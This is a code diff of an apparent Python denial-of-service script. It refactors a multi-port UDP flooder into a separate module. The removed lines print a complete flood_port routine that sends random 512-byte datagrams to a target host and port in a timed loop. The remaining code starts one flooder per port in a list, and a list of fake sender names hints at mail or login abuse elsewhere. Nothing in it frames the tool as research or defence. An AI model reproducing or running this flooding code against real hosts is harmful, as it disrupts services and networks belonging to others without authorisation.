@@ -8,7 +8,9 @@ import time
 import queue
 import sys
 import os
+import port_Flooder
 
+from port_Flooder import flood_port
 from multiprocessing import process
 
 mailfront = ["Zofia", "Test", "Jack", "Alehandro", "Vladimir", "Boston", "Loquisha", "Mahogany", "Ferrari", "Michigan", "August", "Ireland", "Government", "Alerter"]
@@ -57,23 +59,25 @@ def flood_host(host, portlist, flood_time):
     proclist = []
     for port in range(portrange):
         portlisttmp.append(portlist[port])
-    for port in portlisttmp:
+    for port in range(portrange):
+        port = portlisttmp[port]
         count = count + 1
-        #new = count
-        #p = str(new)
         args_tmp = []
         args_tmp.append(host)
         args_tmp.append(port)
-        args_tmp.append(flood_time)
-        print("Creating Class port_flooder for port "+str(port))
-        port_Flooder(args_tmp)
+        args_tmp.append(flood_time[0])
+        print("Creating port_Flooder for port "+str(port))
+        print("Using arguments "+str(args_tmp))
+        p = port_Flooder.port_Flooder(host, port, int(flood_time[0]))
+        proclist.append(p)
+        #p.start()
         #p = multiprocessing.process.BaseProcess(target = flood_port(host, port, flood_time))
         #p.daemon = True
         #proclist.append(p)
         #p.start()
         #p.close()
     #for process in proclist:
-    #    process.process.join()
+        #process.join()
 
     #for port in range(portrange):
         #count = count + 1
@@ -84,39 +88,6 @@ def flood_host(host, portlist, flood_time):
     #for t in threads:
         #t.join()
 
-class port_Flooder(multiprocessing.process.BaseProcess):
-
-    def __init__(self, args_tmp):
-        super().__init__(name = 'Test')
-        print("Class Instantiated")
-        tmphost = (args_tmp[0]) #Host (Constant)
-        tmpport = (args_tmp[1]) #Port (Dynamic)
-        tmpflood_time = (args_tmp[2]) #Flood Time (Constant)
-        self.run(tmphost, tmpport, tmpflood_time)
-
-    def run(self, host, port, f_time):
-        print("run")
-        flood_port(host, port, f_time)
-
-def flood_port(*args):
-    tmphost = args[0]
-    tmpport = args[1]
-    tmpflood_time = args[2]
-    print("Flooding Port "+str(tmpport)+" Using PID "+str(os.getpid()))
-    current_count = 0
-    temp_socket = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-    random_data = bytes(random._urandom(512))
-    stop_time = int(time.time()) + int(tmpflood_time[0])
-    msg = 0
-    while True:
-        if ((stop_time) < (time.time())): #or (current_count > 30): #Artificial Break
-            break
-        else:
-            pass
-        print("Datagram "+str(msg)+" Sent to "+tmphost+" on Port "+str(tmpport))
-        msg = msg + 1
-        temp_socket.sendto(random_data, (tmphost, int(tmpport)))
-        current_count = current_count + 1
 
 def query_Login(host):
     try:
